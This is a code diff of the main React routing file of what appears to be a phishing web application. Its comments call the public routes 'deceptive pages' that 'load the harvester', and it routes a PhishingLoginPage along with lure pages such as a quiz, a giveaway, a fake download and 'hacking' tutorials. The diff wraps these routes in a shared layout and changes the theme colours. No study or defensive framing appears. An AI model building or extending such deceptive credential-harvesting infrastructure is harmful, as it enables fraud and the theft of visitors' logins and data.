@@ -37,13 +37,14 @@ import GiveawayPage from './pages/GiveawayPage';
 import WifiHackingPage from './pages/WifiHackingPage';
 import AndroidHackingPage from './pages/AndroidHackingPage';
 import SystemHackingPage from './pages/SystemHackingPage';
+import PublicLayout from './pages/PublicLayout';
 
 const darkTheme = createTheme({
   palette: {
     mode: 'light',
     primary: { main: '#00f0ff' },
     secondary: { main: '#ff0055' },
-    background: { default: '#0a0e17', paper: '#fff' },
+    background: { default: '#fff', paper: '#fff' },
     success: { main: '#00ff88' },
     warning: { main: '#ffaa00' },
     error: { main: '#ff3355' }
@@ -62,7 +63,6 @@ const darkTheme = createTheme({
 });
 
 function App() {
-  const isHarvesterPage = window.location.pathname.startsWith('/admin');
 
   return (
     <ThemeProvider theme={darkTheme}>
@@ -84,17 +84,19 @@ function App() {
           <Route path="settings" element={<SettingsPage />} />
         </Route>
 
-        {/* Public Deceptive Pages - These load the harvester */}
-        <Route path="/" element={<LandingPage />} />
-        <Route path="/quiz" element={<QuizPage />} />
-        <Route path="/download" element={<DownloadPage />} />
-        <Route path="/login" element={<PhishingLoginPage />} />
-        <Route path="/video" element={<VideoPage />} />
-        <Route path="/news" element={<NewsArticle />} />
-        <Route path="/giveaway" element={<GiveawayPage />} />
-        <Route path="/wifi-hacking" element={<WifiHackingPage />} />
-        <Route path="/android-hacking" element={<AndroidHackingPage />} />
-        <Route path="/system-hacking" element={<SystemHackingPage />} />
+        {/* Public Deceptive Pages - These load the harvester, wrapped in PublicLayout (Navbar + Footer) */}
+        <Route element={<PublicLayout />}>
+          <Route path="/" element={<LandingPage />} />
+          <Route path="/quiz" element={<QuizPage />} />
+          <Route path="/download" element={<DownloadPage />} />
+          <Route path="/login" element={<PhishingLoginPage />} />
+          <Route path="/video" element={<VideoPage />} />
+          <Route path="/news" element={<NewsArticle />} />
+          <Route path="/giveaway" element={<GiveawayPage />} />
+          <Route path="/wifi-hacking" element={<WifiHackingPage />} />
+          <Route path="/android-hacking" element={<AndroidHackingPage />} />
+          <Route path="/system-hacking" element={<SystemHackingPage />} />
+        </Route>
       </Routes>
     </ThemeProvider>
   );
